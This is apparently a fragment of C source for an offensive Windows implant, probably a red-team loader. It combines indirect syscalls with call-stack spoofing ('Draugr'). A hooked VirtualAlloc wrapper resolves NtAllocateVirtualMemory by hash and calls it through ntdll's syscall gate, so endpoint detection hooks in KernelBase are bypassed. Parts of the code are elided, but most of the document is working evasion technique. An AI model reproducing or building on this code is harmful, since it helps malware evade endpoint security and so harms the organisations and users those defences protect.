/*
 * Indirect Syscall Integration — Hook + Syscall Combined
 *
 * Hook wrappers dispatch to the real Win32 API, which resolves to
 * user-mode code in KernelBase where an EDR may still have inline
 * hooks. Issuing an indirect syscall from within the hook wrapper
 * avoids user-mode instrumentation while preserving the ntdll frames
 * that a call stack spoof produces.
 *
 * Draugr stub extension (NASM):
 *   mov r10, rcx
 *   mov rax, [rdi + 72]      ; DRAUGR_PARAMETERS.Ssn
 */

#include <windows.h>

/* ---- Syscall resolution interface ---- */

typedef struct {
    PVOID gate;      /* address of syscall instruction inside ntdll */
    DWORD ssn;       /* system service number */
} SYSCALL;

BOOL resolve_syscall(SYSCALL *syscall, PVOID ntdll, PVOID fn);
void prepare_syscall();
NTSTATUS do_syscall();

/* ---- Draugr parameter structures ---- */

typedef struct {
    PVOID  Fixup;                            /* 0  */
    PVOID  OriginalReturnAddress;            /* 8  */
    PVOID  Rbx;                              /* 16 */
    PVOID  Rdi;                              /* 24 */
    /* ... */
    PVOID  Ssn;                              /* 72 */
} DRAUGR_PARAMETERS;

typedef struct {
    PVOID     ptr;
    DWORD     ssn;      /* passed through to draugr_params.Ssn */
    int       argc;
    ULONG_PTR args[10];
} FUNCTION_CALL;

/* ---- Hook with syscall fallback ---- */

#include "syscalls.h"

#define NTDLL_HASH                    0x3CFA685D
#define NTALLOCATEVIRTUALMEMORY_HASH  0xD33BCABD

LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAlloc, DWORD flProt) {
    PVOID ntdll = findModuleByHash(NTDLL_HASH);
    PVOID ntavm = findFunctionByHash(ntdll, NTALLOCATEVIRTUALMEMORY_HASH);

    SYSCALL sc = {0};
    if (!resolve_syscall(&sc, ntdll, ntavm)) {
        return KERNEL32$VirtualAlloc(lpAddress, dwSize, flAlloc, flProt);  /* fallback */
    }

    /* build args for NtAllocateVirtualMemory, then do the syscall through the spoof stub */
    FUNCTION_CALL call = {0};
    call.ptr  = sc.gate;
    call.ssn  = sc.ssn;
    /* ... populate call.args ... */
    return (LPVOID)spoof_call(&call);
}
